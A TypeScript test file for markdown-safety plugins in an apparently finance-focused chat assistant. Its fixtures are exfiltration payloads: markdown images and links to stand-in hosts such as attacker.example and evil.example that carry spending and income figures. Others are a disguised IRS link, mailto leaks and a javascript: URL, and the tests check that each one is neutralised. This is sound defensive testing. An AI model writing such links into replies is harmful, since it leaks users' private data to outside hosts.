import assert from "node:assert/strict"
import { describe, it } from "node:test"

import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import ReactMarkdown from "react-markdown"
import remarkGfm from "remark-gfm"

import { imagePlaceholder, rehypeNoImages, rehypeSafeLinks, safeLinkHref } from "./markdown-safety.ts"

// Renders the way components/chat-markdown.tsx does (same plugins), without its styling.
function render(markdown: string) {
  return renderToStaticMarkup(
    createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], rehypePlugins: [rehypeNoImages, rehypeSafeLinks] }, markdown)
  )
}

describe("rehypeNoImages", () => {
  it("never renders an image, so a reply can't make the browser call an outside URL", () => {
    const html = render("Your summary ![x](https://attacker.example/pixel?spent=4210&rent=1800) is ready.")
    assert.doesNotMatch(html, /<img/i)
    assert.doesNotMatch(html, /attacker\.example/)
    assert.match(html, /\[image: x\]/)
  })

  it("catches reference-style images and images inside lists and tables", () => {
    const html = render(
      ["- ![a](https://e.test/1)", "", "| col |", "| --- |", "| ![b](https://e.test/2) |", "", "![c][ref]", "", "[ref]: https://e.test/3"].join("\n")
    )
    assert.doesNotMatch(html, /<img/i)
    assert.doesNotMatch(html, /e\.test/)
  })

  it("leaves an image with no alt text as nothing at all", () => {
    assert.doesNotMatch(render("before ![](https://e.test/x) after"), /<img|e\.test|\[image/)
  })

  it("still renders links, tables, emphasis and code as before", () => {
    const html = render("**Tip:** read [lesson 1](/learn/what-investing-is).\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\n`7%`")
    assert.match(html, /<strong>Tip:<\/strong>/)
    assert.match(html, /<a href="\/learn\/what-investing-is">lesson 1<\/a>/)
    assert.match(html, /<table>/)
    assert.match(html, /<code>7%<\/code>/)
  })

  it("keeps fenced chart blocks as code, so the app's own charts are untouched", () => {
    assert.match(render('```chart\n{"type":"bar"}\n```'), /<code class="language-chart">/)
  })
})

describe("imagePlaceholder", () => {
  it("shows trimmed alt text and caps its length", () => {
    assert.equal(imagePlaceholder("  growth chart "), "[image: growth chart]")
    assert.equal(imagePlaceholder("x".repeat(500)).length, "[image: ]".length + 120)
  })

  it("returns nothing for missing or non-text alt", () => {
    assert.equal(imagePlaceholder(undefined), "")
    assert.equal(imagePlaceholder(42), "")
    assert.equal(imagePlaceholder("   "), "")
  })
})

describe("safeLinkHref", () => {
  it("keeps links on this site as they are", () => {
    assert.equal(safeLinkHref("/learn/scams-and-biases"), "/learn/scams-and-biases")
    assert.equal(safeLinkHref("/assistant?q=index%20funds"), "/assistant?q=index%20funds")
    assert.equal(safeLinkHref("#user-content-fn-1"), "#user-content-fn-1")
  })

  it("keeps only where an outside link goes, not data riding along in it", () => {
    assert.equal(safeLinkHref("https://evil.example/r?d=income-5000-spend-4200#x"), "https://evil.example/r")
    assert.equal(safeLinkHref("https://www.irs.gov/retirement-plans?year=2026"), "https://www.irs.gov/retirement-plans")
    assert.equal(safeLinkHref("http://www.evil.example/p?x=1"), "http://www.evil.example/p")
    assert.equal(safeLinkHref("https://5000:4200@evil.example/"), "https://evil.example/")
    assert.equal(safeLinkHref("https://irs.gov@evil.example/"), "https://evil.example/")
  })

  it("turns every other kind of link into plain text", () => {
    for (const href of [
      "mailto:x@evil.example?body=spent%20%244210",
      "tel:+15551234567",
      "xmpp:x@evil.example",
      "javascript:alert(1)",
      "data:text/html,hi",
      "//evil.example/x",
      "/\\evil.example",
      "learn/x",
      "https://evil.example/a b",
      "",
      undefined,
      42,
    ]) {
      assert.equal(safeLinkHref(href), null, String(href))
    }
  })
})

describe("rehypeSafeLinks", () => {
  it("strips the data from a planted link and keeps its words", () => {
    const html = render("Check your personal limit on [IRS.gov](https://irs-limits.example/c?inc=1200&sav=0.12).")
    assert.match(html, /<a href="https:\/\/irs-limits\.example\/c">IRS\.gov<\/a>/)
    assert.doesNotMatch(html, /inc=1200/)
  })

  it("does the same for bare and angle-bracket links", () => {
    const html = render("See <https://evil.example/auto?d=1> or www.evil.example/p?x=2")
    assert.match(html, /href="https:\/\/evil\.example\/auto"/)
    assert.match(html, /href="http:\/\/www\.evil\.example\/p"/)
    assert.doesNotMatch(html, /href="[^"]*[?#]/)
  })

  it("turns mail and protocol-relative links into plain text", () => {
    const html = render("[Email us](mailto:x@evil.example?body=net%201200) or write to help@evil.example, or [this](//evil.example/x).")
    assert.doesNotMatch(html, /<a /)
    assert.match(html, /<span>Email us<\/span>/)
    assert.match(html, /help@evil\.example/)
    assert.doesNotMatch(html, /body=|\/\/evil\.example\/x/)
  })

  it("leaves the course links the assistant writes untouched", () => {
    assert.match(render("Read [lesson 6](/learn/scams-and-biases)."), /<a href="\/learn\/scams-and-biases">lesson 6<\/a>/)
  })

  it("leaves a path through a backslash on this site", () => {
    // Markdown encodes the backslash, so the browser opens this site's own (missing) page.
    assert.match(render("[a](/\\evil.example)"), /<a href="\/%5Cevil\.example">a<\/a>/)
  })
})
